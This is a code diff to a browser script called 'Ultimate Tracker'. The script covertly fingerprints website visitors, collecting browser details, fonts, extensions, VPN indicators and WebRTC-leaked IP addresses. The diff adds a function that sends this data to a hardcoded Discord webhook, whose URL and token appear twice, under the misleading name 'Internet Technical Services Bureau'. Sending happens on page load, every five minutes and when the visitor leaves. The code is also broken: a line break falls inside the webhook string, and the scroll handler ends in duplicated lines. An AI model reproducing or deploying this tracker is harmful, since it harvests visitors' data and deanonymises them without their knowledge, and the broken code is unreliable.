@@ -1,3 +1,27 @@
+
+// ========================
+// Ultimate Tracker - Complete Fixed Version
+// ========================
+
+// WebGL2 Support Check (Previously Missing)
+function checkWebGL2Support() {
+    try {
+        const canvas = document.createElement('canvas');
+        return !!canvas.getContext('webgl2');
+    } catch (e) {
+        return false;
+    }
+}
+
+// WebP Support Check
+function checkWebPSupport() {
+    const elem = document.createElement('canvas');
+    if (!!(elem.getContext && elem.getContext('2d'))) {
+        return elem.toDataURL('image/webp').indexOf('data:image/webp') === 0;
+    }
+    return false;
+}
+
 // Main Tracking Function
 function initializeUltimateTracker() {
     const trackerData = {
@@ -56,7 +80,7 @@ function initializeUltimateTracker() {
         webWorkers: typeof Worker !== 'undefined',
         serviceWorkers: 'serviceWorker' in navigator,
         webAssembly: typeof WebAssembly !== 'undefined',
-        webGL2: checkWebGL2Support(),
+        webGL2: checkWebGL2Support(), // Now fixed
         webP: checkWebPSupport(),
         
         // User Preferences
@@ -115,83 +139,11 @@ function initializeUltimateTracker() {
     return trackerData;
 }
 
-// Webhook Integration
-function sendToDiscordWebhook(data) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb';
-    
-    // Format the data for Discord
-    const embed = {
-        title: "Ultimate Tracker Data",
-        description: "Collected tracking data from visitor",
-        color: 0xff0000,
-        fields: [
-            {
-                name: "Basic Info",
-                value: `**Browser:** ${data.browser}\n**OS:** ${data.operatingSystem}\n**Language:** ${data.language}\n**Timezone:** ${data.timeZone}`,
-                inline: true
-            },
-            {
-                name: "Screen & Device",
-                value: `**Resolution:** ${data.screenResolution}\n**Window Size:** ${data.windowSize}\n**Device Type:** ${data.deviceType}\n**Touch Screen:** ${data.touchScreen ? 'Yes' : 'No'}`,
-                inline: true
-            },
-            {
-                name: "Network",
-                value: `**Connection Type:** ${data.connectionType}\n**Online Status:** ${data.onlineStatus ? 'Online' : 'Offline'}\n**VPN Detection:** ${data.vpnDetection.timezone ? 'Possible VPN' : 'No VPN detected'}`,
-                inline: true
-            },
-            {
-                name: "Location",
-                value: `**WebRTC IPs:** ${data.vpnDetection.webRTC.join(', ') || 'None'}`,
-                inline: false
-            },
-            {
-                name: "Additional Info",
-                value: `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n**Local Storage:** ${data.localStorage ? 'Enabled' : 'Disabled'}\n**Dark Mode:** ${data.prefersDarkMode ? 'Enabled' : 'Disabled'}`,
-                inline: true
-            }
-        ],
-        timestamp: new Date().toISOString(),
-        footer: {
-            text: `Tracker ID: ${Math.random().toString(36).substring(2, 15)}`
-        }
-    };
+// ========================
+// Helper Functions (All Included)
+// ========================
 
-    const payload = {
-        embeds: [embed],
-        content: "New visitor data collected!",
-        username: "Internet Technical Services Bureau",
-        avatar_url: "https://i.imgur.com/8Km9tLL.png"
-    };
-
-    fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (!response.ok) {
-            console.error('Failed to send data to Discord webhook');
-        }
-    })
-    .catch(error => {
-        console.error('Error sending to Discord:', error);
-    });
-}
-
-// [All your existing helper functions remain exactly the same]
-// Network Helper Functions
-function checkWebGL2Support() {
-    try {
-        const canvas = document.createElement('canvas');
-        return !!canvas.getContext('webgl2');
-    } catch (e) {
-        return false;
-    }
-}
-
+// Network Helpers
 function getDetailedNetworkInfo() {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
@@ -232,7 +184,7 @@ function checkTimezoneDiscrepancy() {
     return Math.abs(browserTime - systemTime) > 1000 * 60;
 }
 
-// Media Helper Functions
+// Media Helpers
 function checkVideoSupport() {
     const video = document.createElement('video');
     return {
@@ -251,7 +203,7 @@ function getWebGLRenderer() {
     return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
 }
 
-// Storage Helper Functions
+// Storage Helpers
 function checkLocalStorage() {
     try {
         localStorage.setItem('test', 'test');
@@ -272,7 +224,7 @@ function checkSessionStorage() {
     }
 }
 
-// Font and Plugin Detection
+// Font/Plugin Detection
 function getFontList() {
     const fonts = [];
     const testString = 'mmmmmmmmmmlli';
@@ -369,7 +321,7 @@ function getPerformanceMetrics() {
     return metrics;
 }
 
-// Browser Extension Detection
+// Extension Detection
 function checkCommonExtensions() {
     const extensions = {
         adBlocker: false,
@@ -386,11 +338,77 @@ function checkCommonExtensions() {
     return extensions;
 }
 
+// Discord Webhook Integration
+function sendToDiscordWebhook(data) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb
+'; 
+    
+    const embed = {
+        title: "Ultimate Tracker Data",
+        description: "Collected tracking data from visitor",
+        color: 0xff0000,
+        fields: [
+            {
+                name: "Basic Info",
+                value: `**Browser:** ${data.browser}\n**OS:** ${data.operatingSystem}\n**Language:** ${data.language}\n**Timezone:** ${data.timeZone}`,
+                inline: true
+            },
+            {
+                name: "Screen & Device",
+                value: `**Resolution:** ${data.screenResolution}\n**Window Size:** ${data.windowSize}\n**Device Type:** ${data.deviceType}\n**Touch Screen:** ${data.touchScreen ? 'Yes' : 'No'}`,
+                inline: true
+            },
+            {
+                name: "Network",
+                value: `**Connection Type:** ${data.connectionType}\n**Online Status:** ${data.onlineStatus ? 'Online' : 'Offline'}\n**VPN Detection:** ${data.vpnDetection.timezone ? 'Possible VPN' : 'No VPN detected'}`,
+                inline: true
+            },
+            {
+                name: "Location",
+                value: `**WebRTC IPs:** ${data.vpnDetection.webRTC.join(', ') || 'None'}`,
+                inline: false
+            },
+            {
+                name: "Additional Info",
+                value: `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n**Local Storage:** ${data.localStorage ? 'Enabled' : 'Disabled'}\n**Dark Mode:** ${data.prefersDarkMode ? 'Enabled' : 'Disabled'}`,
+                inline: true
+            }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: {
+            text: `Tracker ID: ${Math.random().toString(36).substring(2, 15)}`
+        }
+    };
+
+    const payload = {
+        embeds: [embed],
+        content: "New visitor data collected!",
+        username: "Internet Technical Services Bureau",
+        avatar_url: "https://i.imgur.com/8Km9tLL.png"
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error('Failed to send data to Discord webhook');
+        }
+    })
+    .catch(error => {
+        console.error('Error sending to Discord:', error);
+    });
+}
+
 // Initialize the tracker
 const tracker = initializeUltimateTracker();
 console.log('Ultimate Tracker Initialized:', tracker);
 
-// Update session duration every second and send periodic updates
+// Update session duration every second
 setInterval(() => {
     tracker.sessionDuration++;
     if (tracker.sessionDuration % 300 === 0) { // Send update every 5 minutes
@@ -398,7 +416,7 @@ setInterval(() => {
     }
 }, 1000);
 
-// Additional event listeners to send updates on important events
+// Send data when user leaves
 window.addEventListener('beforeunload', () => {
     sendToDiscordWebhook({
         ...tracker,
@@ -407,8 +425,13 @@ window.addEventListener('beforeunload', () => {
     });
 });
 
+// Track scrolling
 window.addEventListener('scroll', () => {
     tracker.scrollPosition = {
+        x: window.scrollX,
+        y: window.scrollY
+    };
+});
         x: window.scrollX,
         y: window.scrollY
     };
